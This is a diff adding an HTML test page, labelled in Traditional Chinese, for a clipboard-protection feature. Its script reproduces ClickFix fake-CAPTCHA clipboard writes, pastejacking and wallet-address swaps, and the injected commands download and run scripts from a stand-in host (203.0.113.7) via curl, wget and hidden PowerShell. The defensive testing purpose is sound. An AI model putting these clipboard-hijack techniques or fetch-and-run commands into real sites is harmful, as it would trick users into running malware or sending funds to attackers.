@@ -1,0 +1,203 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>剪貼簿防護測試頁</title>
+  <style>
+    :root { color-scheme: light dark; }
+    body { max-width: 760px; margin: 24px auto; padding: 0 16px; font: 15px/1.6 system-ui, "Noto Sans CJK TC", sans-serif; }
+    section { margin: 18px 0; padding: 12px 14px; border: 1px solid #8884; border-radius: 10px; }
+    h2 { margin: 0 0 6px; font-size: 16px; }
+    .expect { font-size: 13px; opacity: .75; }
+    pre, code, .addr { font-family: ui-monospace, "DejaVu Sans Mono", monospace; }
+    pre { padding: 8px 10px; border-radius: 6px; background: #8881; white-space: pre-wrap; }
+    button { font: inherit; padding: 4px 12px; }
+    textarea { width: 100%; height: 80px; font-family: ui-monospace, monospace; }
+    #offscreen { position: absolute; left: -9999px; top: 0; }
+  </style>
+</head>
+<body>
+  <h1>剪貼簿防護測試頁</h1>
+  <p>每個按鈕模擬一種網頁寫入剪貼簿的方式。指令和網址都是假的（203.0.113.x 是保留給文件用的位址），不會真的執行或連線。
+    按完之後可以在最下面的貼上區按 Ctrl+V，看剪貼簿裡實際是什麼。</p>
+
+  <section>
+    <h2>1. 複製畫面上的指令</h2>
+    <pre id="visible-command">curl -fsSL https://example.com/install.sh | sh</pre>
+    <button id="visible-copy">複製</button>
+    <div class="expect">預期：照常複製，不跳提醒。</div>
+  </section>
+
+  <section>
+    <h2>2. ClickFix：假的「我不是機器人」</h2>
+    <label><input type="checkbox" id="clickfix-writetext"> 我不是機器人</label>
+    <div class="expect">預期：攔下，跳出「已攔下一段指令」。</div>
+  </section>
+
+  <section>
+    <h2>3. ClickFix：藏起來的文字框 + execCommand</h2>
+    <button id="clickfix-textarea">驗證</button>
+    <div class="expect">預期：攔下。</div>
+  </section>
+
+  <section>
+    <h2>4. ClickFix：在 copy 事件裡塞指令</h2>
+    <button id="clickfix-copy-event">驗證</button>
+    <div class="expect">預期：攔下。</div>
+  </section>
+
+  <section>
+    <h2>5. ClickFix：用 ClipboardItem 寫入</h2>
+    <button id="clickfix-item">驗證</button>
+    <div class="expect">預期：攔下。</div>
+  </section>
+
+  <section>
+    <h2>6. ClickFix：借用 iframe 的剪貼簿</h2>
+    <button id="clickfix-iframe">驗證</button>
+    <div class="expect">預期：攔下。</div>
+  </section>
+
+  <section>
+    <h2>7. 指令被拆成兩行</h2>
+    <button id="split-command">驗證</button>
+    <div class="expect">預期：攔下。</div>
+  </section>
+
+  <section>
+    <h2>8. 藏在沒展開分頁裡的安裝指令</h2>
+    <div>
+      <button disabled>Windows</button> <button disabled>macOS</button>
+      <div style="display: none" id="hidden-tab">curl -fsSL https://example.com/linux/install.sh | bash</div>
+    </div>
+    <button id="hidden-tab-copy">複製 Linux 安裝指令</button>
+    <div class="expect">預期：會跳提醒（這是會誤擋的情況），按「仍然複製」就會複製。</div>
+  </section>
+
+  <section>
+    <h2>9. 複製連結</h2>
+    <button id="copy-link">複製這頁的網址</button>
+    <div class="expect">預期：照常複製。</div>
+  </section>
+
+  <section>
+    <h2>10. 複製畫面上沒有的錢包地址</h2>
+    <button id="address-hidden">複製付款地址</button>
+    <div class="expect">預期：攔下，跳出「已攔下一個畫面上沒有的地址」。</div>
+  </section>
+
+  <section>
+    <h2>11. 掉包地址（請自己選取後按 Ctrl+C）</h2>
+    <p>付款地址：<span class="addr" id="swap-address">0x52908400098527886E0F7030069857D2E4169EE7</span></p>
+    <div class="expect">預期：攔下，跳出「已攔下被掉包的地址」；剪貼簿裡是你選的原文。</div>
+  </section>
+
+  <section>
+    <h2>12. 複製時把指令換掉（請自己選取後按 Ctrl+C）</h2>
+    <pre id="pastejack">sudo apt update</pre>
+    <div class="expect">預期：攔下；剪貼簿裡是你選的 sudo apt update。</div>
+  </section>
+
+  <section>
+    <h2>13. 複製時加上出處（請自己選取後按 Ctrl+C）</h2>
+    <p id="attribution">這是一段普通的文章內容，網站會在你複製時加上出處。</p>
+    <div class="expect">預期：照常複製（含出處），不跳提醒。</div>
+  </section>
+
+  <section>
+    <h2>14. 聊天回覆的「複製」按鈕（複製 Markdown 原文）</h2>
+    <div id="chat-reply">
+      <p>先更新套件清單，再安裝：</p>
+      <pre>sudo apt update
+sudo apt install ripgrep</pre>
+      <p>也可以用 <code>rg --version</code> 確認版本。</p>
+    </div>
+    <button id="chat-copy">複製回覆</button>
+    <div class="expect">預期：照常複製，不跳提醒。</div>
+  </section>
+
+  <section>
+    <h2>貼上區</h2>
+    <textarea id="paste" placeholder="在這裡按 Ctrl+V 看剪貼簿的內容"></textarea>
+  </section>
+
+  <script>
+    const evil = 'http://203.0.113.7';
+    const write = text => navigator.clipboard.writeText(text).catch(error => console.warn(error));
+
+    document.getElementById('visible-copy').onclick = () =>
+      write(document.getElementById('visible-command').textContent);
+
+    document.getElementById('clickfix-writetext').onclick = () =>
+      write(`bash -c "$(curl -fsSL ${evil}/v)" # I am not a robot - reCAPTCHA Verification ID: 4821`);
+
+    document.getElementById('clickfix-textarea').onclick = () => {
+      const area = document.createElement('textarea');
+      area.id = 'offscreen';
+      area.value = `curl -s ${evil}/a | sh`;
+      document.body.append(area);
+      area.select();
+      document.execCommand('copy');
+      area.remove();
+    };
+
+    document.getElementById('clickfix-copy-event').onclick = () => {
+      const handler = event => {
+        event.clipboardData.setData('text/plain', `wget -qO- ${evil}/b | bash`);
+        event.preventDefault();
+      };
+      document.addEventListener('copy', handler, {once: true});
+      document.execCommand('copy');
+    };
+
+    document.getElementById('clickfix-item').onclick = () => {
+      const text = `powershell -w hidden -c "iex (irm ${evil}/c)"`;
+      navigator.clipboard.write([new ClipboardItem({'text/plain': new Blob([text], {type: 'text/plain'})})])
+        .catch(error => console.warn(error));
+    };
+
+    document.getElementById('clickfix-iframe').onclick = () => {
+      const frame = document.createElement('iframe');
+      frame.style.cssText = 'position: fixed; width: 1px; height: 1px; opacity: 0; border: 0';
+      document.body.append(frame);
+      // The frame's document needs focus to write to the clipboard
+      frame.contentWindow.focus();
+      frame.contentWindow.navigator.clipboard.writeText(`curl -s ${evil}/d | sh`)
+        .catch(error => console.warn(error))
+        .finally(() => frame.remove());
+    };
+
+    document.getElementById('split-command').onclick = () => write(`curl -s ${evil}/e |\nsh`);
+
+    document.getElementById('hidden-tab-copy').onclick = () =>
+      write(document.getElementById('hidden-tab').textContent);
+
+    document.getElementById('copy-link').onclick = () => write(location.href);
+
+    document.getElementById('address-hidden').onclick = () =>
+      write('bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq');
+
+    // Sections 11 to 13 change what the user copies, as some sites do
+    const inside = (id, node) => document.getElementById(id).contains(node);
+    document.addEventListener('copy', event => {
+      const selection = document.getSelection();
+      const node = selection.anchorNode;
+      if (inside('swap-address', node)) {
+        event.clipboardData.setData('text/plain', '0x000000000000000000000000000000000000dEaD');
+      } else if (inside('pastejack', node)) {
+        event.clipboardData.setData('text/plain', `curl -s ${evil}/f | sh`);
+      } else if (inside('attribution', node)) {
+        event.clipboardData.setData('text/plain', `${selection}\n\n出處：${location.href}`);
+      } else {
+        return;
+      }
+      event.preventDefault();
+    });
+
+    document.getElementById('chat-copy').onclick = () => write(
+      '先更新套件清單，再安裝：\n\n```bash\nsudo apt update\nsudo apt install ripgrep\n```\n\n' +
+      '也可以用 `rg --version` 確認版本。');
+  </script>
+</body>
+</html>
